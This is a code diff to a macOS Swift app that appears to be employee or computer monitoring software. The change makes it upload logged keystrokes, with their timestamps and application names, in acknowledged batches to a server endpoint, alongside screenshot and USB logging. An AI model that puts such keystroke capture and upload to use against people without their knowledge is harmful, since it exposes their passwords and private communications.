@@ -459,6 +459,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
     }
     var eventTap: CFMachPort?
     var keyLogs: [KeyLog]!
+    private var keyboardUploadInProgress = false
     var usbDeviceLogs: [USBDeviceLog]!
     var usbNotificationPort: IONotificationPortRef?
     var usbAddedIterator: io_iterator_t = 0
@@ -2035,29 +2036,66 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
     }
 
     @objc func sendKeyLogs() {
-        logMessage("sendKeyLogs called - keyLogs count: \(keyLogs.count)", level: .debug)
-        
-        if self.keyLogs.count > 0 {
-            logMonitoringEvent("Sending key logs", details: "Count: \(keyLogs.count)")
-            
-            // Log a sample of the key logs for debugging
-            let sampleCount = min(3, keyLogs.count)
-            for i in 0..<sampleCount {
-                let log = keyLogs[i]
-                logMessage("Sample key log \(i+1): \(log.date) - \(log.application) - \(log.key)", level: .debug)
-            }
-            
-            
-                // Send data in chunks
-                sendDataInChunks(data: self.keyLogs, eventType: "KeyLog", chunkSize: 500)
-                self.keyLogs.removeAll(keepingCapacity: true) // Optimized memory management
-            lastKeyLogSent = Date()
-                logSuccess("Key logs sent and cleared", details: "\(keyLogs.count) keys")
-        } else {
-            logMessage("No key logs to send", level: .debug)
+        // Keep every unacknowledged event, including events recorded while a
+        // request is in flight. Never clear the buffer before server success.
+        guard !keyboardUploadInProgress, !keyLogs.isEmpty else { return }
+        guard !clientToken.isEmpty, selectedMonitorId > 0,
+              let urlString=buildEndpoint(false),
+              let url=URL(string:urlString) else {
+            logError("Key log upload needs a signed-in monitor and server endpoint",context:"KeyLog")
+            return
         }
+        let batch=Array(keyLogs.prefix(500))
+        let records:[[String:Any]]=batch.map { event in
+            ["date":event.date,"application":event.application,"key":event.key]
+        }
+        let payload:[String:Any]=[
+            "Event":"KeyLog",
+            "MonitorId":selectedMonitorId,
+            "Version":APP_VERSION,
+            "MacAddress":macAddress,
+            "KeyLogs":records
+        ]
+        guard let body=try? JSONSerialization.data(withJSONObject:payload) else {
+            logError("Failed to serialize keyboard batch",context:"KeyLog")
+            return
+        }
+        var request=URLRequest(url:url)
+        request.httpMethod="POST"
+        request.timeoutInterval=30
+        request.setValue("application/json",forHTTPHeaderField:"Content-Type")
+        request.setValue("Bearer \(clientToken)",forHTTPHeaderField:"Authorization")
+        request.setValue("MonitorClient/\(APP_VERSION)",forHTTPHeaderField:"User-Agent")
+        request.httpBody=body
+        keyboardUploadInProgress=true
+        URLSession.shared.dataTask(with:request){[weak self] data,response,error in
+            DispatchQueue.main.async {
+                guard let self=self else {return}
+                self.keyboardUploadInProgress=false
+                let status=(response as? HTTPURLResponse)?.statusCode ?? 0
+                let json=(data.flatMap{try? JSONSerialization.jsonObject(with:$0)}) as? [String:Any]
+                let accepted=status==200 && (json?["status"] as? String)=="success"
+                let inserted=((json?["data"] as? [String:Any])?["inserted_count"] as? Int) ?? 0
+                if accepted && inserted==batch.count {
+                    // This removes only the transmitted prefix; newer keys
+                    // remain queued in original chronological order.
+                    if self.keyLogs.count>=batch.count {
+                        self.keyLogs.removeFirst(batch.count)
+                    }
+                    self.lastKeyLogSent=Date()
+                    self.logMessage("Stored \(inserted) keyboard events",level:.info)
+                    if !self.keyLogs.isEmpty { self.sendKeyLogs() }
+                } else {
+                    let reason=(json?["error"] as? String) ??
+                        error?.localizedDescription ??
+                        "HTTP \(status), inserted \(inserted)/\(batch.count)"
+                    self.logError("Keyboard upload not acknowledged: \(reason)",context:"KeyLog")
+                    // Keep pending records; the next scheduled retry will send them.
+                }
+            }
+        }.resume()
     }
-    
+
     @objc func TakeScreenShotsAndPost() {
         guard isScreenRecordingEnabled() else {
             logError("Screen recording permission not granted", context: "Screenshot")
